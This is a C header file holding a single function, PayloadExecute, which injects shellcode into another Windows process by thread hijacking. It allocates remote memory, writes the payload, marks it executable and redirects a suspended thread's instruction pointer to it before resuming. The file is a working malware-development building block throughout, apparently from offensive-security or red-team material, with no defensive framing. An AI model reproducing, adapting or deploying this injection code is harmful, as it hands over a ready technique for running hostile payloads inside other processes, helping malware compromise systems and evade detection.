#pragma once
#include <stdio.h>
#include <Windows.h>


BOOL PayloadExecute(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT OPTIONAL PBYTE* ppAddress, OUT OPTIONAL HANDLE* phThread) {


	SIZE_T  sNumberOfBytesWritten    = NULL;
	DWORD   dwOldProtection          = NULL;


	*ppAddress = (PBYTE)VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);


	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


    CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = (DWORD64)*ppAddress;
  
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ResumeThread(hThread);
	
    // Just for testing purposes (TO REMOVE)
	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}